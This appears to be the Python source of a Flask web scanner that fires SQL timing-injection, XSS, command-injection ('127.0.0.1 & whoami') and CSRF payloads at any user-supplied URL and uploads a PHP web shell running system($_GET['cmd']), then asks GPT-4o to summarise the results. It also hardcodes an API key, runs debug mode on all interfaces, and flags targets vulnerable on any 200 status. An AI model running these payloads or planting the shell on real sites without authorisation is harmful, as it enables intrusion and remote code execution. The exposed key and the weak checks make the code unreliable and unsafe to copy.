from openai import OpenAI
from flask import Flask, request, jsonify, send_from_directory
import requests
import time

client = OpenAI(
    api_key="sk-kV59IKjNe5B46S8TB5E233E2A6844b409f3a7b5c8cD3C98a",
    base_url="https://api.v3.cm/v1/"
)

app = Flask(__name__, static_folder='./web', static_url_path='/')


@app.route('/')
def index():
    return send_from_directory(app.static_folder, 'index.html')


# 定义各类常见漏洞测试的 payload 模板
VUL_PAYLOADS = {
    "SQLInjection": {
        "type": "TIMING",
        "param": "id",
        "normal": "1",
        "injection": "1' AND SLEEP(5)-- "
    },
    "XSS": {
        "type": "GET",
        "endpoint": "/xss.php",
        "param": "name",
        "template": "<script>alert('XSS')</script>"
    },
    "CommandInjection": {
        "type": "GET",
        "param": "host",
        "template": "127.0.0.1 & whoami"
    },
    "FileUpload": {
        "type": "UPLOAD",
        # 文件上传示例，仅供演示，实际请确认目标接口路径
        "endpoint": "/file.php",
        "field": "file",
        "filename": "shell.php",
        "content": "<?php echo 'cmd:' . system($_GET['cmd']); ?>"
    },
    "CSRF": {
        "type": "POST",
        # 示例 POST 参数，实际请确认目标接口路径
        "endpoint": "/csrf.php",
        "params": {
            "target": "victim_account",
            "amount": "1000"
        }
    }
}

# 常见SQL错误关键词
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlite error",
    "sqlstate",
    "fatal error"
]

def contains_sql_error(snippet: str) -> bool:
    """
    如果 snippet 中包含常见的 SQL 错误关键词，就认为有报错信息。
    """
    low = snippet.lower()
    return any(err in low for err in SQL_ERRORS)

def send_sqli_timing_test(url: str, param: str, normal_payload: str, injection_payload: str, timeout=10):
    """时间盲注测试"""
    result = {
        "status_code": None,
        "snippet": "",
        "delay_detected": False,
        "t_normal": None,
        "t_inject": None,
        "error_found": False
    }

    try:
        sep = "&" if "?" in url else "?"
        # 正常请求
        normal_url = f"{url}{sep}{param}={requests.utils.requote_uri(normal_payload)}"
        t1 = time.time()
        r1 = requests.get(normal_url, timeout=timeout)
        t_normal = time.time() - t1

        # 延迟注入请求
        inject_url = f"{url}{sep}{param}={requests.utils.requote_uri(injection_payload)}"
        t2 = time.time()
        r2 = requests.get(inject_url, timeout=timeout + 5)
        t_inject = time.time() - t2

        snippet = r2.text[:500] if r2.text else ""
        error_found = contains_sql_error(snippet)
        delay_detected = (t_inject - t_normal) > 4  # 如果注入导致超过4秒延迟，则认为注入生效

        result.update({
            "status_code": r2.status_code,
            "snippet": snippet,
            "delay_detected": delay_detected,
            "t_normal": round(t_normal, 2),
            "t_inject": round(t_inject, 2),
            "error_found": error_found
        })
    except Exception as e:
        # 请求超时或网络错误
        result["snippet"] = f"请求异常：{str(e)}"
    return result

def send_get_test(base_url: str, payload_param: str, payload_value: str, timeout=5):
    """GET类型漏洞测试"""
    try:
        sep = "&" if "?" in base_url else "?"
        test_url = f"{base_url}{sep}{payload_param}={requests.utils.requote_uri(payload_value)}"
        r = requests.get(test_url, timeout=timeout)
        snippet = r.text[:500] if r.text else ""
        return r.status_code, snippet
    except Exception as e:
        return None, f"请求异常：{str(e)}"


def send_file_upload_test(base_url: str, endpoint: str, field: str, filename: str, file_content: str, timeout=10):
    """文件上传漏洞测试"""
    upload_url = base_url.rstrip('/') + endpoint
    files = {
        field: (filename, file_content, 'application/x-php')
    }
    try:
        r = requests.post(upload_url, files=files, timeout=timeout)
        snippet = r.text[:500] if r.text else ""
        return upload_url, r.status_code, snippet
    except Exception as e:
        return upload_url, None, f"请求异常：{str(e)}"


def send_post_test(base_url: str, endpoint: str, data: dict, timeout=5):
    """POST类型漏洞测试"""
    post_url = base_url.rstrip('/') + endpoint
    try:
        r = requests.post(post_url, data=data, timeout=timeout)
        snippet = r.text[:500] if r.text else ""
        return post_url, r.status_code, snippet
    except Exception as e:
        return post_url, None, f"请求异常：{str(e)}"


@app.route('/api/detect', methods=['POST'])
def detect_vulnerability():
    data = request.get_json()
    url = data.get('url', '').strip()
    if not url or not url.lower().startswith(('http://', 'https://')):
        return jsonify({"error": "无效的 URL 格式，请以 http:// 或 https:// 开头"}), 400

    results = {}

    # 1. SQL注入测试
    sqli = VUL_PAYLOADS["SQLInjection"]
    sqli_result = send_sqli_timing_test(
        url,
        param=sqli["param"],
        normal_payload=sqli["normal"],
        injection_payload=sqli["injection"]
    )
    # 综合判断：如果发现明显延迟 或 在响应片段中检测到 SQL 错误，则视为 vulnerable
    is_vul = sqli_result["delay_detected"] or sqli_result["error_found"]
    results["SQLInjection"] = {
        "normal_payload": sqli["normal"],
        "injection_payload": sqli["injection"],
        "status_code": sqli_result["status_code"],
        "delay_detected": sqli_result["delay_detected"],
        "error_found": sqli_result["error_found"],
        "t_normal": sqli_result["t_normal"],
        "t_inject": sqli_result["t_inject"],
        "vulnerable": is_vul,
        "snippet": sqli_result["snippet"]
    }

    # 2. XSS测试
    xss = VUL_PAYLOADS["XSS"]
    status, snippet = send_get_test(url, xss["param"], xss["template"])
    results["XSS"] = {
        "payload": xss["template"],
        "status_code": status,
        # "vulnerable": (status == 200 and xss["template"] in (snippet or "")),
        "vulnerable": (status == 200),
        "snippet": snippet
    }

    # 3. 命令注入测试
    cmdi = VUL_PAYLOADS["CommandInjection"]
    status, snippet = send_get_test(url, cmdi["param"], cmdi["template"])
    results["CommandInjection"] = {
        "payload": cmdi["template"],
        "status_code": status,
        # "vulnerable": (status == 200 and len((snippet or "").strip()) > 0),
        "vulnerable": (status == 200 ),
        "snippet": snippet
    }

    # 4. 文件上传测试
    fu = VUL_PAYLOADS["FileUpload"]
    upload_url, status, snippet = send_file_upload_test(url, fu["endpoint"], fu["field"], fu["filename"], fu["content"])
    results["FileUpload"] = {
        "upload_endpoint": upload_url,
        "file_name": fu["filename"],
        "status_code": status,
        # "vulnerable": (status == 200 and ("uploaded" in (snippet or "").lower() or "success" in (snippet or "").lower())),
        "vulnerable": (status == 200),
        "snippet": snippet
    }

    # 5. CSRF测试
    csrf = VUL_PAYLOADS["CSRF"]
    post_url, status, snippet = send_post_test(url, csrf["endpoint"], csrf["params"])
    results["CSRF"] = {
        "endpoint": post_url,
        "params": csrf["params"],
        "status_code": status,
        # "vulnerable": (status == 200 and "向账户" in (snippet or "")),
        "vulnerable": (status == 200),
        "snippet": snippet
    }

    # 调用大模型对检测结果做综合分析
    '''
    设计prompt，让大模型协助判断漏洞
        注意：prompt分为两部分 
        - 角色设定：指定ai所担任的角色为Web安全专家，使得回复有更合适的风格
        - 输入内容：输入待测链接，使用格式化代替输入
    '''
    try:
        summary_prompt = "你是 Web 安全专家。以下是对某网址进行多种 payload 测试所得的原始结果：\n"
        for vul_type, info in results.items():
            summary_prompt += f"\n>>> 漏洞类型：{vul_type}\n"
            if "payload" in info:
                summary_prompt += f"Payload: {info['payload']}\n"
            if "endpoint" in info:
                summary_prompt += f"Endpoint: {info['endpoint']}\n"
            if "upload_endpoint" in info:
                summary_prompt += f"Upload Endpoint: {info['upload_endpoint']}\n"
            summary_prompt += f"Status Code: {info.get('status_code')}\n"
            summary_prompt += f"响应片段: {(info.get('snippet') or '')[:200].replace(chr(10), ' ')}\n"
            summary_prompt += f"初步判断 vulnerable: {info.get('vulnerable')}\n"
        summary_prompt += ("\n请基于以上信息，根据最终的专业判断：哪些漏洞类型极有可能成立？哪些是误报？并给出简要建议，**不需要输出判断结果。**"
                           "\n请**只用纯文本格式**输出，**不需要markdown语法**，**不需要输出判断结果。**。"
                           "若均没有明显的漏洞特征，允许且仅需要得到**正常**的结论，无需给出测试方法，")

        msg = [{"role": "user", "content": summary_prompt}]
        resp = client.chat.completions.create(
            model="gpt-4o",
            messages=msg
        )
        lm_summary = resp.choices[0].message.content
    except Exception:
        lm_summary = "模型调用失败或未启用"

    return jsonify({
        "raw_results": results,
        "lm_summary": lm_summary
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
